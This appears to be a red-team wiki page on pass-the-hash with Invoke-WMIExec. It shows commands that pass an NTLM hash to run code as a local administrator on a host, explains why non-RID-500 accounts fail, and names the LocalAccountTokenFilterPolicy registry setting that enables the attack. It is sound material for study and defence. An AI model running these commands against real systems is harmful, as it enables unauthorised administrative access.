# Pass The Hash: Privilege Escalation with Invoke-WMIExec

## Pass The Hash: Privilege Escalation with Invoke-WMIExec

### Execution

If you have an NTLMv2 hash of a local administrator on a box ws01, it's possible to pass that hash and execute code with privileges of that local administrator account:

```csharp
Invoke-WmiExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username administrator -command hostname
```

Below shows how the user `low` is not a local admin, passes the hash of the local `administrator` account on ws01 and executes a command successfully:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLI7anu4TZnyfBS8wf%2Fimage.png?alt=media\&token=95cbbbfd-a826-4008-a6d5-441077e39c99)

### RID != 500 - No Pass The Hash for You

Say you have a hash of the user spotless who you know is a local admin on ws01:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLKMGqv9l9KRD9VPZ-%2Fimage.png?alt=media\&token=74aa1280-16ff-4bce-852c-4a33689dd7f1)

...but when you attempt passing the hash, you get access denied - why is that?

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLKGom5n8YrBvqXleI%2Fimage.png?alt=media\&token=95b3622a-10b1-4bc3-892b-75f099fdb879)

It may be because hashes for accounts that are not RID=500 (not default administrator accounts) are stripped of some privileges during the token creation.

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLIxysmm-wrRcD6DHb%2Fimage.png?alt=media\&token=9821355c-120c-4069-982a-0cff9a855cee)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLIqJWY2Kvz6AWgmup%2Fimage.png?alt=media\&token=891bb978-677b-44b1-aacb-59eb8b29d1f3)

If the target system you are passing the hash to, has the following registry key/value/data set to 0x1, pass the hash will work even for accounts that are not RID 500:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLGamBIQD-6JVQflAu%2Fimage.png?alt=media\&token=8e914f5f-ee09-4a63-bc02-fb7647c04d00)

```csharp
Invoke-WmiExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username spotless -command hostname
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoLGBP1i3zwReOayORF%2F-LoLIN-9CpyZOEomvzuF%2Fimage.png?alt=media\&token=48309612-9000-4d4a-892d-538d0c7a9472)

### References
